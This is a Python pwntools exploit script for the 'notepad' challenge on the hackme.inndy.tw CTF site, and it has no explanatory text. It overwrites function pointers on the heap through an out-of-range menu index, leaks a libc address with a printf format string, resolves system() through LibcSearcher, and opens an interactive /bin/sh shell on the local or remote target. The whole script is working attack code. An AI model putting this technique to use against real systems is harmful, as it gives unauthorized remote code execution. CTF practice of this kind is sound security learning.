#!/user/bin/python
# -*- coding: utf-8 -*- 

from pwn import *
from LibcSearcher import LibcSearcher
import string
context.binary = './notepad'
context.log_level = 'debug'
context.timeout = 10000
elf = context.binary
libc = context.binary.libc

if args['REMOTE']:
	p = remote('hackme.inndy.tw', 7713)
else:
	p = process('./notepad')
	main_arena = 0x1b27b0



def menu(ch):
	p.recvuntil('::> ')
	p.sendline(ch)

def cmd(command):
	menu('a')
	p.sendlineafter('Inndy>', command)

def bash(sh):
	menu('b')
	p.sendlineafter('~$ ', sh)

def notepad():
	menu('c')

def add(size, content):
	menu('a')
	p.sendlineafter('size > ', str(size))
	p.sendlineafter('data > ', content)

def open(idx, content, edit, show):
	menu('b')
	p.sendlineafter('id > ', str(idx))
	p.sendlineafter('(Y/n)', edit)
	if edit == 'Y':
		p.sendlineafter('content > ', content)


def delete(idx):
	menu('c')
	p.sendlineafter('id > ', str(idx))


def readonly(idx):
	menu('d')
	p.sendlineafter('id > ', str(idx))

def keepsec(idx):
	menu('e')
	p.sendlineafter('id > ', str(idx))

def dbg():
	gdb.attach(p, 'b* 0x8048E0B')
	raw_input()


free_plt = elf.plt['free']
printf_plt = elf.plt['printf']
puts_got = elf.got['puts']

notepad()
add(0x48, 'a'*0x10)							#0
add(0x48, p32(free_plt)*0x10)				#1
add(0x48, 'c'*0x8)							#2
add(0x48, 'd'*0x8)							#3


open(2, 'c'*0x10, 'Y', 1)
menu('\x50')
delete(1)

add(0x98, p32(printf_plt)*0x14 + "%1063$p")	#12 ==> 1

#open(2, 'c'*0x10, 'Y', 1)
menu('b')
p.sendlineafter('id > ', '2')
menu('\x50')
libc_start_main = int(p.recvline().strip('\x0a'), 16) - 247

#local
"""
libc_base = libc_start_main - libc.symbols['__libc_start_main']
system_addr = libc_base + libc.symbols['system']
"""

#remote
libc = LibcSearcher('__libc_start_main', libc_start_main)
libc_base = libc_start_main - libc.dump('__libc_start_main')
system_addr = libc_base + libc.dump('system')

print "libc_base ==> " + hex(libc_base)
print "__libc_start_main ==> " + hex(libc_start_main)
print "system_addr ==> " + hex(system_addr)

#dbg()

open(1, p32(system_addr)*0x14 + "/bin/sh\x00", 'Y', '1')
menu('a')

#open(2, 'c'*0x10, 'Y', '1')
menu('b')
p.sendlineafter('id > ', '2')
menu('\x50')


p.interactive()
p.close()


#  0x08048CE8